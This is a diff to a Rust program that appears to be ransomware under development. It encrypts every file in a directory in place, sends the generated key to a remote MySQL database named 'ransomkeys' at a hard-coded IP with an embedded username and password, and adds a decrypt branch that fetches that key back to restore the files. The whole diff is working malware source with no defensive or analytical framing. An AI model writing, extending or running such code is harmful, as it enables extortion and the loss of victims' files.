@@ -1,8 +1,7 @@
-use std::{process::exit, io::{Read, Write}, fs::OpenOptions};
+use std::{process::exit, io::{Read, Write}, fs::{OpenOptions, self}};
 use std::error::Error;
 use orion::{aead, kex::SecretKey};
 use base64::{Engine as _, engine::{general_purpose}};
-use zeroize::Zeroize;
 use uuid::Uuid;
 use mysql::{Pool, PooledConn, prelude::Queryable};
 use std::sync::Arc;
@@ -21,15 +20,12 @@ fn getfiles(path: &str) -> Result<Vec<String>, Box<dyn Error>> {
 	Ok(files)
 }
 
-fn decrypt(stringtodec: &str) -> Result<String, Box<dyn Error>>{
+fn decrypt(stringtodec: &str, b64key: String) -> Result<String, Box<dyn Error>>{
 	let enctext = general_purpose::STANDARD.decode(stringtodec)?;
-	let mut key = [0u8; 32];
-	let mut file = std::fs::File::open("J:\\secret_key.txt")?;
-	file.read_exact(&mut key)?;
-	let key2 = aead::SecretKey::from_slice(&key)?;
+	let b64key2 = general_purpose::STANDARD.decode(b64key)?;
+	let key2 = aead::SecretKey::from_slice(&b64key2)?;
 	let dectxt = aead::open(&key2, &enctext)?;
 	let dectxt2 = std::str::from_utf8(&dectxt)?;
-	key.zeroize();
 	return Ok(dectxt2.to_string());
 }
 
@@ -72,7 +68,6 @@ fn main() -> Result<(), Box<dyn Error>>{
 		exit(1);
 	}
 	let path = &args[2];
-	let files = getfiles(path)?;
 	let secret_key53 = orion::aead::SecretKey::default();
 	let seckey65 = secret_key53.unprotected_as_bytes();
 	let url = "mysql://deja:S9$SjaXyGr7xh!7@89.215.12.15/ransomkeys";
@@ -81,6 +76,7 @@ fn main() -> Result<(), Box<dyn Error>>{
 	let enc6432 = general_purpose::STANDARD.encode(seckey65);
 	create_table(newest_string, &mut conn, enc6432);
 			if args[1] == "encrypt" {
+				let files = getfiles(path)?;
 				for file in files {
 					let filee324 = file;
 					let mut filee = OpenOptions::new().write(true).open(&filee324).unwrap();
@@ -93,11 +89,27 @@ fn main() -> Result<(), Box<dyn Error>>{
 						println!("{}", enc64);
 					}		
 			}
-			//if args[1] == "decrypt"{
-			//	let decced = decrypt(&filecont)?;
-			//	filee.set_len(0)?;
-			//	filee.write(decced.as_bytes())?;
-			//}
+			if args[1] == "decrypt"{
+				let files = getfiles(path)?;
+				let mut key_value: Option<String> = None;
+				let checkquery = format!(
+					"SELECT `key` FROM `32fe76c702e0462e989a8d8185e12bab`;"
+				);
+				let result = conn.query_iter(checkquery).unwrap();
+				for row in result {
+					let key: String = mysql::from_row(row.unwrap());
+					key_value = Some(key);
+				}
+				let key_str = key_value.unwrap_or_default();
+				for file in files {
+					let mut fileopen = OpenOptions::new().write(true).open(&file).unwrap();
+					let filecont = fs::read(file)?;
+					let wtf23 = String::from_utf8(filecont)?;
+					let decced = decrypt(&wtf23, key_str.clone())?;
+					fileopen.set_len(0)?;
+					fileopen.write(decced.as_bytes())?;
+				}
+			}
 	}
 	println!("Press enter to exit.");
 	let mut input = String::new();
